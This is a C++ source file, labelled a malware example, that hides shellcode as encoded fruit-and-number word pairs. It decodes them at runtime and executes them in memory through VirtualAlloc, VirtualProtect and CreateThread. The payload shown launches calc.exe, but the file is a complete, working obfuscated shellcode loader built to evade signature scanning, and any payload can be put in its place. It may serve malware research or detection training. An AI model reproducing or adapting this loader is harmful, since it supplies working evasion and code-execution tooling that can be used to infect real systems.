/*
cpp implementation malware example with calc.exe payload
*/
#include <windows.h>
#include <cstdint>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <vector>
#include <string>
#include <iostream>
#include <map>
#include <sstream>
#include <cstdint>

std::string decode_word(const std::string &encoded)
{
    static const std::map<std::string, char> hex_to_word = {
        {"zero", '0'}, {"one", '1'}, {"two", '2'}, {"three", '3'}, {"four", '4'}, {"five", '5'}, {"six", '6'}, {"seven", '7'}, {"eight", '8'}, {"nine", '9'}};

    std::vector<std::string> words;
    size_t pos = encoded.find(' ');
    words.push_back(encoded.substr(0, pos));
    words.push_back(encoded.substr(pos + 1));

    std::string decoded;
    for (const auto &word : words)
    {
        if (hex_to_word.count(word))
        {
            decoded += hex_to_word.at(word);
        }
        else
        {
            decoded += word[0];
        }
    }
    return decoded;
}
std::vector<std::string> decode_words(const std::vector<std::string> &encoded_words)
{
    std::vector<std::string> decoded_words;
    for (const auto &encoded_word : encoded_words)
    {
        decoded_words.push_back(decode_word(encoded_word));
    }
    return decoded_words;
}
uint8_t hexToUInt8(std::string hexValue)
{
    uint8_t result = 0;
    for (const auto &c : hexValue)
    {
        result <<= 4;
        if (c >= '0' && c <= '9')
        {
            result |= (c - '0');
        }
        else if (c >= 'a' && c <= 'f')
        {
            result |= (c - 'a' + 10);
        }
        else if (c >= 'A' && c <= 'F')
        {
            result |= (c - 'A' + 10);
        }
        else
        {
            throw std::invalid_argument("Invalid hex character: " + c);
        }
    }
    return result;
}
void convertStringsToUint8(const std::vector<std::string> &strings, std::uint8_t *result)
{
    for (std::size_t i = 0; i < strings.size(); i++)
    {
        result[i] = hexToUInt8(strings[i]);
    }
}

int main(void)
{
    std::vector<std::string> encoded_payload = {
        "fig cherry", "four eight", "eight three", "egg four", "fig zero", "egg eight", "cherry zero", "zero zero", "zero zero", "zero zero", "four one", "five one", "four one", "five zero", "five two", "five one", "five six", "four eight", "three one", "date two", "six five", "four eight", "eight banana", "five two", "six zero", "four eight", "eight banana", "five two", "one eight", "four eight", "eight banana", "five two", "two zero", "four eight", "eight banana", "seven two", "five zero", "four eight", "zero fig", "banana seven", "four apple", "four apple", "four date", "three one", "cherry nine", "four eight", "three one", "cherry zero", "apple cherry", "three cherry", "six one", "seven cherry", "zero two", "two cherry", "two zero", "four one", "cherry one", "cherry nine", "zero date", "four one", "zero one", "cherry one", "egg two", "egg date", "five two", "four one", "five one", "four eight", "eight banana", "five two", "two zero", "eight banana", "four two", "three cherry", "four eight", "zero one", "date zero", "eight banana", "eight zero", "eight eight", "zero zero", "zero zero", "zero zero", "four eight", "eight five", "cherry zero", "seven four", "six seven", "four eight", "zero one", "date zero", "five zero", "eight banana", "four eight", "one eight", "four four", "eight banana", "four zero", "two zero", "four nine", "zero one", "date zero", "egg three", "five six", "four eight", "fig fig", "cherry nine", "four one", "eight banana", "three four", "eight eight", "four eight", "zero one", "date six", "four date", "three one", "cherry nine", "four eight", "three one", "cherry zero", "apple cherry", "four one", "cherry one", "cherry nine", "zero date", "four one", "zero one", "cherry one", "three eight", "egg zero", "seven five", "fig one", "four cherry", "zero three", "four cherry", "two four", "zero eight", "four five", "three nine", "date one", "seven five", "date eight", "five eight", "four four", "eight banana", "four zero", "two four", "four nine", "zero one", "date zero", "six six", "four one", "eight banana", "zero cherry", "four eight", "four four", "eight banana", "four zero", "one cherry", "four nine", "zero one", "date zero", "four one", "eight banana", "zero four", "eight eight", "four eight", "zero one", "date zero", "four one", "five eight", "four one", "five eight", "five egg", "five nine", "five apple", "four one", "five eight", "four one", "five nine", "four one", "five apple", "four eight", "eight three", "egg cherry", "two zero", "four one", "five two", "fig fig", "egg zero", "five eight", "four one", "five nine", "five apple", "four eight", "eight banana", "one two", "egg nine", "five seven", "fig fig", "fig fig", "fig fig", "five date", "four eight", "banana apple", "zero one", "zero zero", "zero zero", "zero zero", "zero zero", "zero zero", "zero zero", "zero zero", "four eight", "eight date", "eight date", "zero one", "zero one", "zero zero", "zero zero", "four one", "banana apple", "three one", "eight banana", "six fig", "eight seven", "fig fig", "date five", "banana banana", "fig zero", "banana five", "apple two", "five six", "four one", "banana apple", "apple six", "nine five", "banana date", "nine date", "fig fig", "date five", "four eight", "eight three", "cherry four", "two eight", "three cherry", "zero six", "seven cherry", "zero apple", "eight zero", "fig banana", "egg zero", "seven five", "zero five", "banana banana", "four seven", "one three", "seven two", "six fig", "six apple", "zero zero", "five nine", "four one", "eight nine", "date apple", "fig fig", "date five", "six three", "six one", "six cherry", "six three", "two egg", "six five", "seven eight", "six five", "zero zero"};

    std::vector<std::string> decoded_payload = decode_words(encoded_payload);

    const size_t my_payload_len = 276;
    std::uint8_t my_payload[my_payload_len];

    //convert the vector of uint8 to raw array my_payload
    convertStringsToUint8(decoded_payload, my_payload);

    //the standard injection
    void *my_payload_mem; // memory buffer for payload
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // Allocate a memory buffer for payload
    my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to buffer
    RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);

    // make new buffer as executable
    rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
    if (rv != 0)
    {

        // run payload
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)my_payload_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }
    return 0;
}